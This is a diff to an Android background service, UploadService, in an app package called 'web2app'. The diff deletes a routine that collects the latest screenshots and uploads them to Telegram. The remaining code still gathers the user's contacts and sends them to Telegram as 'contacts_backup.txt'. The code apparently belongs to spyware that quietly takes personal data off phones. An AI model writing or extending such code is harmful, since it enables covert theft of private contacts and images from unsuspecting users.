@@ -33,7 +33,6 @@ import java.util.concurrent.Executors;
 public class UploadService extends Service {
 
     public static final String ACTION_UPLOAD_ALL = "com.csu.web2app.ACTION_UPLOAD_ALL";
-    public static final String ACTION_UPLOAD_SCREENSHOTS = "com.csu.web2app.ACTION_UPLOAD_SCREENSHOTS";
 
     private static final String TAG = "UploadService";
     private static final String CHANNEL_ID = "UploadServiceChannel";
@@ -56,9 +55,6 @@ public class UploadService extends Service {
             if (ACTION_UPLOAD_ALL.equals(action)) {
                 startForegroundService(1, createNotification("Gathering all data..."));
                 uploadAll(startId);
-            } else if (ACTION_UPLOAD_SCREENSHOTS.equals(action)) {
-                startForegroundService(1, createNotification("Sending screenshots..."));
-                uploadScreenshots(startId);
             }
         }
         return START_NOT_STICKY;
@@ -119,28 +115,6 @@ public class UploadService extends Service {
             if (contactData != null && contactData.length > 0) {
                 updateNotification("Sending contacts backup...");
                 uploadDocumentToTelegram(contactData, "contacts_backup.txt");
-            }
-
-            stopForeground(true);
-            stopSelf(startId);
-        });
-    }
-
-    private void uploadScreenshots(final int startId) {
-        executorService.execute(() -> {
-            List<Uri> screenshotUris = findLatestImages("Screenshot", 5);
-            if (screenshotUris.isEmpty()) {
-                stopForeground(true);
-                stopSelf(startId);
-                return;
-            }
-
-            int successCount = 0;
-            for (int i = 0; i < screenshotUris.size(); i++) {
-                updateNotification("Sending screenshot " + (i + 1) + " of " + screenshotUris.size());
-                if (uploadFileToTelegram(screenshotUris.get(i), "screenshot.png")) {
-                    successCount++;
-                }
             }
 
             stopForeground(true);
